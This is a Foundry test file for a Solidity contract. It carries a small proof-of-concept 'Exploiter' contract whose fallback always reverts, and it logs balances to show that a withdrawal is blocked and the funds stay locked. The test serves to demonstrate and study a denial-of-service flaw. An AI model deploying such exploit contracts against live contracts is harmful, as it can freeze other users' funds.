// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console.sol"; // Added for differential logging
import "../src/reentrancy_simple.sol";

contract ReentrancySimpleTest is Test {
    Reentrance public target;
    Exploiter public exploiter;

    function setUp() public {
        target = new Reentrance();
        exploiter = new Exploiter();
    }

    function testDenialOfServiceOnWithdrawal() public {
        // Fund exploiter contract and deposit to target
        uint256 depositAmount = 1 ether;
        exploiter.depositToTarget{value: depositAmount}(address(target));

        // Verify deposit was successful
        assertEq(target.getBalance(address(exploiter)), depositAmount);
        
        console.log("--- BEFORE-Trigger state ---");
        uint256 exploiterBalanceBefore = target.getBalance(address(exploiter));
        uint256 targetContractBalanceBefore = target.getContractBalance();
        console.log("Exploiter balance (before): ", exploiterBalanceBefore);
        console.log("Target contract balance (before): ", targetContractBalanceBefore);

        console.log("--- Trigger exploit ---");
        // Attempt withdrawal (this will call the exploiter's fallback which reverts)
        vm.expectRevert();
        exploiter.exploit(address(target));

        console.log("--- AFTER-Trigger state ---");
        uint256 exploiterBalanceAfter = target.getBalance(address(exploiter));
        uint256 targetContractBalanceAfter = target.getContractBalance();
        console.log("Exploiter balance (after): ", exploiterBalanceAfter);
        console.log("Target contract balance (after): ", targetContractBalanceAfter);

        // Analyze state persistence
        bool fundsLocked = (exploiterBalanceBefore == exploiterBalanceAfter) && 
                           (targetContractBalanceBefore == targetContractBalanceAfter);
                           
        if (fundsLocked) {
            console.log("Vulnerability Exists: The contract state remains unchanged after exploit, confirming funds are locked due to failed withdrawal.");
        } else {
            console.log("Vulnerability not Exist: The contract state changed during exploit execution.");
        }
        
        // Original withdrawal validation
        assertEq(exploiterBalanceAfter, depositAmount);
        assertEq(targetContractBalanceAfter, depositAmount);
    }
}

contract Exploiter {
    function depositToTarget(address target) external payable {
        Reentrance(target).addToBalance{value: msg.value}();
    }
    
    function exploit(address target) external {
        Reentrance(target).withdrawBalance();
    }

    fallback() external payable {
        revert("Always failing");
    }
}